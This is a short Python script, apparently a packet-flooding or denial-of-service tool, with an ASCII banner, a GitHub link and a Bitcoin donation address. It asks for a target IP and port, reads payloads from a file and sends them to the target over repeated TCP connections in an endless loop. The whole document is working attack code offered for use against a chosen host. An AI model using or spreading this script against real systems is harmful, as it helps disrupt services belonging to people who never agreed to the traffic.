import socket
import threading
import time

def read_packets(filename):
    try:
        with open(filename, 'r') as file:
            packets = file.readlines()
        return packets
    except Exception as e:
        print("Error reading packets from file:", e)
        return []

def send_packets(ip, port, packets):
    while True:
        try:
            for packet in packets:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.sendall(packet.encode())
                s.close()
                print("Packet sent to {}:{}".format(ip, port))
                time.sleep(1)  # Delay between sending packets
        except Exception as e:
            print("Error:", e)

def main():
    # Print tool banner
    print("""
 ______      _____     ______  ______    ______ __   __   
|  _  \    /  ___|    | ___ \ | ___ \   | ___ \\ \ / /   
| | | |___ \ `--.  ___| |_/ / | |_/ /___| |_/ /_\ V /___ 
| | | / _ \ `--. \/ _ \    /  |    // _ \  __/ _ \ // _ \\
| |/ / (_) /\__/ /  __/ |\ \  | |\ \  __/ | |  __/ |  __/
|___/ \___/\____/ \___\_| \_| \_| \_\___\_|  \___\_/\___|
                                                         
                                                         
GitHub: https://github.com/LIPTOID0
Bitcoin Wallet for Donations: bc1qzmd58zt8za7uzjtgngmg99a69gg04f4knk7mm7
""")

    # Get target IP address and port
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))

    # Read packets from file
    packets = read_packets("paket.txt")

    # Start sending packets in a separate thread
    send_thread = threading.Thread(target=send_packets, args=(target_ip, target_port, packets))
    send_thread.start()

    # Keep the main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()